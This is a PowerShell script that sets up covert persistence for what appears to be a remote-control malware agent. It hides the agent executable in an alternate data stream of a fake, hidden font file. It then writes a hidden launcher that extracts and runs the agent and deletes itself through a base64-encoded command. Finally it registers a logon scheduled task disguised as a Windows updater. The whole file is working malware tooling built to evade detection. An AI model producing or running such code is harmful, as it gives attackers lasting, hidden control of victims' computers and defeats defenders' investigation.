$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'  # We want to know when things fail
$channelID = $env:ChannelID
$agentPath = $env:AgentPath
$logFile = "$env:TEMP\persist_log_$channelID.txt"

# Logging function
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append -Encoding utf8
    Write-Output "$timestamp - $Message"
}

Write-Log "Starting persistence setup for agent at $agentPath"

if (-not $agentPath -or -not (Test-Path $agentPath)) {
    Write-Log "❌ AgentPath invalid or not set. Exiting."
    exit 1
}

# --- 1. Create hidden fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    try {
        New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
        attrib +h $fontDir
        Write-Log "[+] Created hidden fonts folder: $fontDir"
    } catch {
        Write-Log "[-] Failed to create fonts folder: $_"
    }
} else {
    Write-Log "[+] Using existing fonts folder: $fontDir"
}

# Use a unique font name that doesn't conflict (msstyles.ttf is safe)
$fontFile = "$fontDir\msstyles.ttf"
if (-not (Test-Path $fontFile)) {
    try {
        # Create a fake binary file (random 1KB data)
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $bytes = New-Object byte[] 1024
        $rng.GetBytes($bytes)
        [System.IO.File]::WriteAllBytes($fontFile, $bytes)
        attrib +h $fontFile
        Write-Log "[+] Created fake font file: $fontFile"
    } catch {
        Write-Log "[-] Failed to create font file: $_"
    }
} else {
    Write-Log "[+] Using existing font file: $fontFile"
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
Write-Log "[+] Hiding agent in ADS: $fontFile`:$streamName"
try {
    $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
    Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
    Write-Log "[+] Agent hidden successfully"
} catch {
    Write-Log "[-] Failed to write ADS: $_"
    # Continue anyway? Maybe exit.
    exit 1
}
$hiddenPath = "$fontFile`:$streamName"

# --- 3. Create launcher script (run.ps1) with self-delete logic ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$ErrorActionPreference = 'Stop'
`$channelID = '$channelID'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent_`$channelID.exe"
`$launcherLog = "`$env:TEMP\launcher_log_`$channelID.txt"

function Write-LauncherLog {
    param([string]`$Message)
    `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "`$timestamp - `$Message" | Out-File -FilePath `$launcherLog -Append -Encoding utf8
}

Write-LauncherLog "Launcher started"

# Delete old temp agent if it exists (ignore errors if locked)
Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue
Write-LauncherLog "Removed old temp agent if present"

# Extract agent from ADS
try {
    `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -ErrorAction Stop
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Write-LauncherLog "Extracted agent to `$tempAgent"
} catch {
    Write-LauncherLog "Failed to extract agent: `$_"
    exit 1
}

# Run agent hidden
try {
    `$proc = Start-Process -WindowStyle Hidden -FilePath `$tempAgent -PassThru
    Write-LauncherLog "Started agent with PID `$(`$proc.Id)"
} catch {
    Write-LauncherLog "Failed to start agent: `$_"
    exit 1
}

# Self-destruct: launch a separate PowerShell process that waits and deletes this launcher script
`$selfDestructScript = @"
Start-Sleep -Seconds 10
Remove-Item -Path '$launcherPath' -Force -ErrorAction SilentlyContinue
Remove-Item -Path '`$launcherLog' -Force -ErrorAction SilentlyContinue
"@
`$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$selfDestructScript))
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand `$encoded"

Write-LauncherLog "Self-destruct scheduled"
"@

Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Log "[+] Created launcher with self-destruct: $launcherPath"

# --- 4. Persistence mechanism (scheduled task) ---
$taskName = "WindowsUpdaterTask_$channelID"
$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""

Write-Log "[*] Attempting to create scheduled task via COM..."

try {
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    
    # Delete existing task if any
    try { $rootFolder.DeleteTask($taskName, 0) } catch { Write-Log "No existing task to delete" }
    
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3  # Interactive token
    $taskDefinition.Principal.RunLevel = 1   # Highest available
    
    $trigger = $taskDefinition.Triggers.Create(9) # Logon trigger
    $trigger.UserId = $env:USERNAME
    
    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
    
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Log "[+] Scheduled task '$taskName' created via COM."
    $persistenceSet = $true
} catch {
    Write-Log "[-] COM task creation failed: $_"
    # Fallback to schtasks
    try {
        schtasks /delete /tn $taskName /f *>$null 2>&1
        schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Log "[+] Scheduled task '$taskName' created via schtasks."
            $persistenceSet = $true
        } else {
            Write-Log "[-] schtasks failed with exit code $LASTEXITCODE"
        }
    } catch {
        Write-Log "[-] schtasks exception: $_"
    }
}

if ($persistenceSet) {
    Write-Log ""
    Write-Log "✅ PERSISTENCE COMPLETE"
    Write-Log "Script location: $launcherPath"
    Write-Log "Agent hidden in: $hiddenPath"
    Write-Log "Persistence will activate on next logon."
} else {
    Write-Log "❌ All persistence methods failed. Check permissions."
}